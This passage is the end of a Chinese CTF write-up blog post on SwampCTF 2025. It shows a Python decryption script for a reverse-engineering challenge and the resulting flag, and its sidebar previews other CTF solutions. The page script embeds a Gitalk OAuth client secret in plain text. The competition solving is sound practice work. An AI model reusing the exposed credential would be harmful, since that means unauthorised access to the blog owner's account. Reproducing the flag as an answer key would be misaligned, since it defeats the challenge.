flag.append(original_byte)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">cipher = [<span class="number">0xDD</span>, <span class="number">0x9A</span>, <span class="number">0xDE</span>, <span class="number">0x4E</span>, <span class="number">0x69</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x2C</span>, <span class="number">0xD2</span>, <span class="number">0x4E</span>, <span class="number">0xEC</span>, <span class="number">0xE7</span>, <span class="number">0x18</span>, <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x56</span>, <span class="number">0x79</span>, <span class="number">0xD8</span>, <span class="number">0xA3</span>, <span class="number">0x55</span>, <span class="number">0x72</span>, <span class="number">0xBC</span>, <span class="number">0x76</span>, <span class="number">0xC4</span>, <span class="number">0x0C</span>, <span class="number">0x0F</span>, <span class="number">0x9B</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0x81</span>, <span class="number">0xE2</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0xA0</span>, <span class="number">0xF4</span>, <span class="number">0x26</span>]  </span><br><span class="line">a = <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">flag = decrypt_data(cipher, a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的字节数据转换为字符串</span></span><br><span class="line">decrypted_text = <span class="string">''</span>.join(<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag:"</span>, decrypted_text)</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>swampCTF{531F_L0AD1NG_T0TALLY_RUL3Z}</p>
</blockquote>
<p>这两道没做出来，给自己埋个坑，后面再补</p>
<h3 id="Midi-Melody"><a href="#Midi-Melody" class="headerlink" title="Midi Melody"></a>Midi Melody</h3><blockquote>
<p>Midi is where the magic happens</p>
</blockquote>
<h3 id="Wamp-Audio"><a href="#Wamp-Audio" class="headerlink" title="Wamp Audio"></a>Wamp Audio</h3><blockquote>
<p>I started recording my flags using a new codec I made called Wamp. However, I lost the decoder! Can you help?</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://warmlight19.github.io">warmlight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://warmlight19.github.io/2025/03/31/swampCTF2025/">https://warmlight19.github.io/2025/03/31/swampCTF2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://warmlight19.github.io" target="_blank">warmlight</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/write-up/">write up</a></div><div class="post-share"><div class="social-share" data-image="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/08/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B/" title="第18届全国大学生软件创新大赛-软件系统安全攻防赛"><img class="cover" src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119211728903.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-08</div><div class="info-item-2">第18届全国大学生软件创新大赛-软件系统安全攻防赛</div></div><div class="info-2"><div class="info-item-1">钓鱼邮件 给了一个.eml文件，outlook打开，有一个生日快乐.zip，解压需要密码，根据发件日期，24岁等信息，可以猜测出解压密码即为生日20001111  解压后得到生日快乐.exe，双击运行，wirshark抓包，找到ip和port  md5结果   donntyousee 查看函数sub_405559() 存在花指令  将retnop掉 动调跑一下，这里一定要在函数sub_405559()里面下断，不然单步会直接跳过该函数，直接跟丢了 多次尝试发现这个call是进行输入的地方，这里直接进行输入然后步过 这两个call步入 第一个call，发现是rc4初始化 第二个call是魔改的RC4，最后加了个亦或 跟一下加密后的结果，找到存储密文的地址unk_5C6CC0 然后去看密文在哪里进行check，这里交叉引用  定位到函数sub_4054FB，这个call步入 发现密文 秘钥key  这里做了反调试，导致key动态和静态的值不一样   将密文和keydump出来，用工具解密即可 </div></div></div></a><a class="pagination-related" href="/2025/01/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" title="第八届西湖论剑网络安全技能大赛"><img class="cover" src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124230630811.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-25</div><div class="info-item-2">第八届西湖论剑网络安全技能大赛</div></div><div class="info-2"><div class="info-item-1"> 第一次参加西湖论剑，实力太弱，只能被各路大佬碾压，在这里对比赛中写的两道题来做个记录…  ReverseBitdance题目没给附件 nc/9999-&gt;139.155.126.78:28936  脚本爆破下输入长度，得到长度为96位 123456789101112131415161718192021222324252627import subprocessimport timedef run_nc_and_check_response():    length = 1     while True:        input_str = 'a' * length         print(f"Trying with input: {input_str}")        process = subprocess.Popen(['nc', '139.155.126.78', '28936'],                              ...</div></div></div></a><a class="pagination-related" href="/2025/01/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Writeup/" title="第一届“启航杯”网络安全挑战赛-Writeup"><img class="cover" src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126005411471.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-26</div><div class="info-item-2">第一届“启航杯”网络安全挑战赛-Writeup</div></div><div class="info-2"><div class="info-item-1"> reverse部分三道题都比较简单，当做刷熟练度了，大部分时间去做misc和取证了，取证还没来得及复现，先发一部分，还是太懒了，要复现的越欠越多。。。  Reversechecker主函数逻辑很简单，就是先输入然后调用check  验证函数，调用了加密函数，然后用加密结果去和密文比较，密文已经给了，直接dump就行  encrypted_flag  加密函数``encrypt_flag，逐位亦或0x23`  解密脚本 1234567891011121314data = [    0x72, 0x6B, 0x60, 0x77, 0x65, 0x58, 0x46, 0x46,    0x15, 0x40, 0x14, 0x41, 0x1A, 0x40, 0x0E, 0x46,    0x14, 0x45, 0x16, 0x0E, 0x17, 0x45, 0x42, 0x41,    0x0E, 0x1A, 0x41, 0x47, 0x45, 0x0E, 0x46, 0x42,    0x13, 0x14, 0x46, 0x13, 0x10, 0x17,...</div></div></div></a><a class="pagination-related" href="/2025/03/31/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-%E7%8E%B0%E5%9C%BA%E8%B5%9B/" title="第十八届全国大学生软件系统安全赛-现场赛"><img class="cover" src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174822638.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-31</div><div class="info-item-2">第十八届全国大学生软件系统安全赛-现场赛</div></div><div class="info-2"><div class="info-item-1">第十八届全国大学生软件系统安全赛-现场赛5G消息 CTF-NetA分析流量包，其解析tls流量需要tls.keylog文件  tcp流中存在明文  多条流量中包含了keylog的内容  几段内容拼接后内容为： 1234567# sslkeylogSERVER_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1...</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">warmlight</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/warmlight19"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/warmlight19" target="_blank" title="Github"><i class="fab fa-square-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:warmlight19@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">小趴菜的的逆向学习之路</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SwampCTF2025-by-Pwn13ss"><span class="toc-number">1.</span> <span class="toc-text">SwampCTF2025 by Pwn13ss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Serialies"><span class="toc-number">1.1.1.</span> <span class="toc-text">Serialies</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">1.2.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Homeword-Help"><span class="toc-number">1.2.1.</span> <span class="toc-text">Homeword Help</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Preferential-Treatment"><span class="toc-number">1.2.2.</span> <span class="toc-text">Preferential Treatment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Planetary-Storage"><span class="toc-number">1.2.3.</span> <span class="toc-text">Planetary Storage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MuddyWater"><span class="toc-number">1.2.4.</span> <span class="toc-text">MuddyWater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proto-Proto"><span class="toc-number">1.2.5.</span> <span class="toc-text">Proto Proto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proto-Proto-2"><span class="toc-number">1.2.6.</span> <span class="toc-text">Proto Proto 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rock-my-Password"><span class="toc-number">1.3.1.</span> <span class="toc-text">Rock my Password</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rock-my-Password%E2%80%94150"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Rock my Password—150</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rev"><span class="toc-number">1.4.</span> <span class="toc-text">rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#You-Shall-Not-Passss"><span class="toc-number">1.4.1.</span> <span class="toc-text">You Shall Not Passss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Midi-Melody"><span class="toc-number">1.4.2.</span> <span class="toc-text">Midi Melody</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wamp-Audio"><span class="toc-number">1.4.3.</span> <span class="toc-text">Wamp Audio</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/31/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-%E7%8E%B0%E5%9C%BA%E8%B5%9B/" title="第十八届全国大学生软件系统安全赛-现场赛"><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174822638.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十八届全国大学生软件系统安全赛-现场赛"></a><div class="content"><a class="title" href="/2025/03/31/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-%E7%8E%B0%E5%9C%BA%E8%B5%9B/" title="第十八届全国大学生软件系统安全赛-现场赛">第十八届全国大学生软件系统安全赛-现场赛</a><time datetime="2025-03-31T12:41:40.000Z" title="发表于 2025-03-31 20:41:40">2025-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/31/swampCTF2025/" title="SwampCTF2025"><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SwampCTF2025"></a><div class="content"><a class="title" href="/2025/03/31/swampCTF2025/" title="SwampCTF2025">SwampCTF2025</a><time datetime="2025-03-31T12:28:13.000Z" title="发表于 2025-03-31 20:28:13">2025-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Writeup/" title="第一届“启航杯”网络安全挑战赛-Writeup"><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126005411471.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第一届“启航杯”网络安全挑战赛-Writeup"></a><div class="content"><a class="title" href="/2025/01/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Writeup/" title="第一届“启航杯”网络安全挑战赛-Writeup">第一届“启航杯”网络安全挑战赛-Writeup</a><time datetime="2025-01-25T16:42:48.000Z" title="发表于 2025-01-26 00:42:48">2025-01-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" title="第八届西湖论剑网络安全技能大赛"><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124230630811.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第八届西湖论剑网络安全技能大赛"></a><div class="content"><a class="title" href="/2025/01/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" title="第八届西湖论剑网络安全技能大赛">第八届西湖论剑网络安全技能大赛</a><time datetime="2025-01-24T16:52:14.000Z" title="发表于 2025-01-25 00:52:14">2025-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/08/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B/" title="第18届全国大学生软件创新大赛-软件系统安全攻防赛"><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119211728903.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第18届全国大学生软件创新大赛-软件系统安全攻防赛"></a><div class="content"><a class="title" href="/2025/01/08/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B/" title="第18届全国大学生软件创新大赛-软件系统安全攻防赛">第18届全国大学生软件创新大赛-软件系统安全攻防赛</a><time datetime="2025-01-08T03:06:07.000Z" title="发表于 2025-01-08 11:06:07">2025-01-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2024 - 2025 By warmlight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://warmlight19.github.io/">Hi, welcome to my blog! </a> <a>一个想打好CTF的菜鸟</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  const initGitalk = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyGitalk = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const gitalk = new Gitalk({
      clientID: 'Ov23liLf6qjERXmVd91g',
      clientSecret: '0a6ea4497e64ab037e6b1269f7f12a0030c97d58',
      repo: 'warmlight-comments',
      owner: 'warmlight19',
      admin: ['warmlight19'],
      updateCountCallback: commentCount,
      ...option,
      id: isShuoshuo ? path : (option && option.id) || 'cf0257aff678c98dc1662e3d8c135fe2'
    })

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async(el, path) => {
    if (typeof Gitalk === 'function') initGitalk(el, path)
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
      initGitalk(el, path)
    }
  }

  if (isShuoshuo) {
    'Gitalk' === 'Gitalk'
      ? window.shuoshuoComment = { loadComment: loadGitalk }
      : window.loadOtherComment = loadGitalk
    return
  }

  if ('Gitalk' === 'Gitalk' || !true) {
    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zindex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>